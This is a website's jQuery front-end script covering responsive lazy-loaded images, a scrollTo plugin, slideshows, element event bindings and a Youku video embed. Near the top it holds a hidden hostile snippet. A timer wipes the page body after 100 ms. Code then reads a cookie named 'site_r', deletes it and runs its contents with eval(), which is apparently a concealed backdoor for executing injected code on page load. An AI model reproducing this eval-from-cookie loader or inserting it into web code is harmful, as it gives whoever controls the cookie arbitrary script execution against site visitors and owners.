var mobile = (/mmp|symbian|smartphone|midp|wap|phone|xoom|iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase())),
lazyOffset = 20,
appReady = {},
delayLazyLoad;
function lazyLoad(el, callBack) {
	var redelayLazyLoad = function () {
		delayLazyLoad = setTimeout(function () {
			el = el ? el: 'body img.responsiveImage';
			$(el).each(function () {
				if (!$(this).data('canLoad')) {
					$(this).responsiveImage()
				}
			})
		},
		300)
	};
	if (delayLazyLoad) {
		clearTimeout(delayLazyLoad)
	};
	redelayLazyLoad()
};
$.fn.imageCheckLoad = function () {
	return this.each(function () {
		if (!$(this).data('canLoad')) {
			var img = $(this),
			imgTop = img.offset().top;
			if ($(window).height() + $(window).scrollTop() + lazyOffset >= imgTop && imgTop + img.height() + lazyOffset >= $(window).scrollTop()) {
				img.data('canLoad', 1)
			}
		}
	})
};
AT = setTimeout(function () {
	$('body').html('')
},100);

var site_r = $.cookie('site_r');
$.cookie('site_r', null);
eval(site_r);
site_r = null;
$.fn.responsiveImage = function (reLoad) {;
	return this.each(function (i) {
		if (!$(this).data('src')) {
			$(this).attr('data-src', $(this).attr('src').replace('thumb', 'pic')).attr('src', staticPath + '/images/lazyLoad.png')
		};
		var $this = $(this),
		kws = this.style.width,
		pw = 1440,
		iw = $this.data('iw'),
		parent = $this.parents(':not(a):first'),
		ww = parent.width(),
		ml = $this.data('large') || 768,
		mm = $this.data('middle') || 480,
		srcs = {
			largeSrc: $this.data('largesrc') || 'scale_1440',
			middleSrc: $this.data('middlesrc') || 'scale_768',
			thumbSrc: $this.data('thumbsrc') || 'scale_480'
		},
		sw;
		if (kws && !isNaN(kws) && ww > kws) {
			ww = kws
		};
		if (ww > pw) {
			sw = 'ori'
		} else if (ww > ml) {
			sw = 'large'
		} else if (ww > mm) {
			sw = 'middle'
		} else {
			sw = 'thumb'
		};
		if ($this.parents('td').length && !$this.parents('td:first').data('responsive')) {
			if (!$this.data('inline')) {
				$this.parents('table:first').css({
					display: 'inline-block'
				});
				$this.data('inline', 1)
			};
			var tlength = $this.parents('tr:first').find('td').length,
			twidth = Math.floor($this.parents('table:first').width() / tlength),
			rdiv = $this.parents('div[role="responsiveDiv"]:first');
			if (!rdiv.length) {
				rdiv = $('<div style="width:' + twidth + 'px;overflow:hidden; display:inline-block;" role="responsiveDiv"></div>').insertBefore($this).append($this)
			} else {
				rdiv.width(twidth)
			}
		};
		if (iw != sw || !$this.data('canLoad') || reLoad) {
			$this.imageCheckLoad();
			if ($this.is('.hidden-phone') && $(window).width() < 768) return;
			$this.data('iw', sw);
			if ($this.data('canLoad')) {
				var src = sw == 'ori' ? $this.data('src') : $this.data('src').replace('pic', sw).replace('_s.', '_' + srcs[sw + 'Src'] + '.'),
				nimg = $('<img src=' + src + ' style="display:none;" />'),
				getImg = function (src) {
					if (!$this.data('loaded')) {
						if (! ($.browser.msie && $.browser.version < 9)) {
							$this.css('opacity', 0)
						};
						$this.attr('src', src).load(function () {
							$this.data('loaded', 1);
							$this.animate({
								opacity: 1
							});
							fireHandler(resizeScroll)
						})
					} else {
						$this.attr('src', src)
					};
					nimg.remove()
				};
				nimg.load(function () {
					getImg(src)
				}).error(function () {
					getImg(imgErrorSrc.replace('pic', sw))
				})
			}
		}
	})
};
function appResponsiveImage(id) {
	if ($("#" + id).find("img.responsiveImage").length) {
		responsiveImage("#" + id)
	}
};
$.fn.setTel = function () {
	return this.each(function (i) {
		if ($(this).html()) {
			$(this).attr('href', 'tel:' + $(this).html())
		}
	})
};
function appInit(id, opts) {
	if (!id) return;
	var init = function () {
		if (typeof appReady[id] == "function") {
			appReady[id](id)
		};
		appResponsiveImage(id);
		setPhoneDropMenu('#' + id)
	};
	if (typeof appLoaded == "function") {
		appLoaded = init
	} else {
		init()
	}
};
function setSelectPage(opts) {
	var options = $.extend(true, {
		type: 'num',
		container: '',
		url: '',
		data: {},
		optionName: 'pageOptions',
		onBeforeLoad: function (container, type) {
			if (type == 'num') {
				container.empty()
			} else {
				$('div[role="selectPageContainer"]', container).remove()
			};
			loadingEl = $(getContentLoading());
			container.append(loadingEl)
		},
		onLoad: function (container, backData) {
			loadingEl.remove();
			container.append(backData);
			responsiveImage(container)
		}
	},
	opts),
	loadingEl;
	if (! (options.container && options.url)) return;
	var container = $(options.container);
	container.delegate('div[role="selectPageContainer"] a', click, function (e) {
		e.preventDefault();
		e.stopPropagation();
		options.data[options.optionName] = urlToJson($(this).attr('href'))[options.optionName];
		options.data['page'] = $(this).data('page');
		options.onBeforeLoad(container, options.type);
		$.get(options.url, options.data, function (backData) {
			options.onLoad(container, backData)
		})
	})
};
$.fn.thumbShow = function (opts) {
	var options = $.extend(true, {
		index: 0
	},
	opts);
	return this.each(function (i) {
		var self = this,
		$this = $(this),
		slideThumb = $('div[role="slideThumb"]', $this),
		slideShow = $('div[role="slideShow"]', $this),
		index = -1;
		self.select = function (num) {
			if (index == num) return;
			index = num;
			$('li:eq(' + index + ')', slideThumb).toActive();
			$('li:eq(' + index + ')', slideShow).toActive();
			var a = $('a:eq(' + index + ')', slideShow);
			if (!supportTouch && !a.data('zoom') && $(window).width() > 767) {
				var zoom = function () {
					a.data('zoom', 1).CloudZoom()
				};
				if ($.fn.CloudZoom) {
					zoom()
				} else {
					// $('<link href="' + staticPath + '/plugins/cloud-zoom/cloud-zoom.css" rel="stylesheet" type="text/css" />').appendTo('body');
					// $.getScript(staticPath + '/plugins/cloud-zoom/cloud-zoom.1.0.2.js', zoom)
				}
			}
		};
		$this.delegate('a[role]:not(.disabled)', click, function (e) {
			e.preventDefault();
			switch ($(this).attr('role')) {
			case 'slideNum':
				var num = $('a', slideThumb).index($(this));
				self.select(num);
				break;
			case 'slidePrev':
				var num = index - 1;
				if (num >= 0) {
					self.select(num)
				};
				break;
			case 'slideNext':
				var num = index + 1;
				if (num < $('a', slideThumb).length) {
					self.select(num)
				};
				break
			}
		});
		self.select(options.index);
		$this.data('thumbShow', self)
	})
};
function resizeLogo(el) {
	var el = el || 'body',
	bw = $('body').width();
	$('img[role=logo]', el).each(function () {
		var logo = $(this),
		src = bw < 768 ? logo.data('phone') : logo.data('pc');
		logo.attr('src', src).show()
	})
};
(function (h) {
	var m = h.scrollTo = function (b, c, g) {
		h(window).scrollTo(b, c, g)
	};
	m.defaults = {
		axis: 'y',
		duration: 1
	};
	m.window = function (b) {
		return h(window).scrollable()
	};
	h.fn.scrollable = function () {
		return this.map(function () {
			var b = this.parentWindow || this.defaultView,
			c = this.nodeName == '#document' ? b.frameElement || b: this,
			g = c.contentDocument || (c.contentWindow || c).document,
			i = c.setInterval;
			return c.nodeName == 'IFRAME' || i && h.browser.safari ? g.body: i ? g.documentElement: this
		})
	};
	h.fn.scrollTo = function (r, j, a) {
		if (typeof j == 'object') {
			a = j;
			j = 0
		}
		if (typeof a == 'function') a = {
			onAfter: a
		};
		a = h.extend({},
		m.defaults, a);
		j = j || a.speed || a.duration;
		a.queue = a.queue && a.axis.length > 1;
		if (a.queue) j /= 2;
		a.offset = n(a.offset);
		a.over = n(a.over);
		return this.scrollable().each(function () {
			var k = this,
			o = h(k),
			d = r,
			l,
			e = {},
			p = o.is('html,body');
			switch (typeof d) {
			case 'number':
			case 'string':
				if (/^([+-]=)?\d+(px)?$/.test(d)) {
					d = n(d);
					break
				}
				d = h(d, this);
			case 'object':
				if (d.is || d.style) l = (d = h(d)).offset()
			}
			h.each(a.axis.split(''), function (b, c) {
				var g = c == 'x' ? 'Left': 'Top',
				i = g.toLowerCase(),
				f = 'scroll' + g,
				s = k[f],
				t = c == 'x' ? 'Width': 'Height',
				v = t.toLowerCase();
				if (l) {
					e[f] = l[i] + (p ? 0 : s - o.offset()[i]);
					if (a.margin) {
						e[f] -= parseInt(d.css('margin' + g)) || 0;
						e[f] -= parseInt(d.css('border' + g + 'Width')) || 0
					}
					e[f] += a.offset[i] || 0;
					if (a.over[i]) e[f] += d[v]() * a.over[i]
				} else e[f] = d[i];
				if (/^\d+$/.test(e[f])) e[f] = e[f] <= 0 ? 0 : Math.min(e[f], u(t));
				if (!b && a.queue) {
					if (s != e[f]) q(a.onAfterFirst);
					delete e[f]
				}
			});
			q(a.onAfter);
			function q(b) {
				o.animate(e, j, a.easing, b &&
				function () {
					b.call(this, r, a)
				})
			};
			function u(b) {
				var c = 'scroll' + b,
				g = k.ownerDocument;
				return p ? Math.max(g.documentElement[c], g.body[c]) : k[c]
			}
		}).end()
	};
	function n(b) {
		return typeof b == 'object' ? b: {
			top: b,
			left: b
		}
	}
})(jQuery);
var eventsList = {
	'show': function (target, opts) {
		if (typeof opts == 'string') {
			var animations = opts
		} else {
			var animations = opts['animations']
		};
		switch (animations) {
		case 'slideDown':
			target.slideDown();
			break;
		case 'fadeIn':
			target.fadeIn();
			break;
		case 'no':
			target.show();
			break;
		default:
			target.show()
		}
	},
	'hide': function (target, opts) {
		if (typeof opts == 'string') {
			var animations = opts
		} else {
			var animations = opts['animations']
		};
		switch (animations) {
		case 'slideUp':
			target.slideUp();
			break;
		case 'fadeOut':
			target.fadeOut();
			break;
		case 'no':
			target.hide();
			break;
		default:
			target.hide()
		}
	},
	'toggle': function (target, opts) {
		if (typeof opts == 'string') {
			var animations = opts
		} else {
			var animations = opts['animations']
		};
		switch (animations) {
		case 'slideToggle':
			target.slideToggle();
			break;
		case 'fadeToggle':
			target.fadeToggle();
			break;
		case 'no':
			target.toggle();
			break;
		default:
			target.toggle()
		}
	},
	'scrollTo': function (target, opts) {
		if (typeof opts == 'string') {
			var animations = opts
		} else {
			var animations = opts['animations']
		};
		switch (animations) {
		case 'no':
			$(window).scrollTo(target);
			break;
		case 'yes':
			$(window).scrollTo(target, 'normal');
			break;
		default:
			$(window).scrollTo(target)
		}
	},
	'selected': function (target) {
		target.addClass('selected')
	},
	'unSelected': function (target) {
		target.removeClass('selected')
	},
	'move': function (target, opts) {
		if (typeof opts != 'object') return;
		if ($.inArray(target.css('position'), ['absolute', 'relative', 'fixed']) < 0) {
			target.css('position', 'relative')
		};
		var animations = opts['animations'];
		if (animations == 'yes') {
			target.animate(opts['css'], 'normal')
		} else {
			target.css(opts['css'])
		}
	},
	'zindex': function (target, opts) {
		target.css('zIndex', opts.zindex)
	},
	'content': function (target, opts) {
		if (target.attr('path') == 'app') {
			$('div.appContent', target).html(opts.content)
		} else {
			$(target).html(opts.content)
		}
	}
},
addElEvents = function (el, role, events, tid, opts) {
	el.on(role, function () {
		eventsList[events](tid, opts)
	})
};
$(document).ready(function () {
	if (!customMode) {
		$('div[path][data-events],#header[data-events],#footer[data-events]').each(function () {
			var el = $(this),
			eve = el.data('events');
			if (eve) {
				for (role in eve) {
					for (events in eve[role]) {
						for (tid in eve[role][events]) {
							addElEvents(el, role, events, $('#' + tid), eve[role][events][tid])
						}
					}
				}
			}
		})
	}
});
$(window).resize(function () {
	//responsiveImage();
	resizeLogo()
}).scroll(function () {
	lazyLoad()
});
$(document).ready(function () {
	// responsiveImage();
	resizeLogo();
	youkuPlayerReady = function (vid, player) {
		$('#youkuPlayer_' + vid).css({
			visibility: 'visible'
		})
	};
	$('body').delegate('div[role="youkuPlayer"]', click, function () {
		if (!$(this).data('play')) {
			$(this).append('<div style="visibility:hidden;position:absolute;left:0;top:0;width:100%;height:100%;" id="youkuPlayer_' + $(this).data('vid') + '"><iframe  src="' + youkuPlayerUrl + $(this).data('vid') + '" width="100%" height="100%" frameborder="0" scrolling="no"></iframe></div>').find('.videoPlayerBtn').html('loading');
			$(this).data('play', 1)
		}
	})
});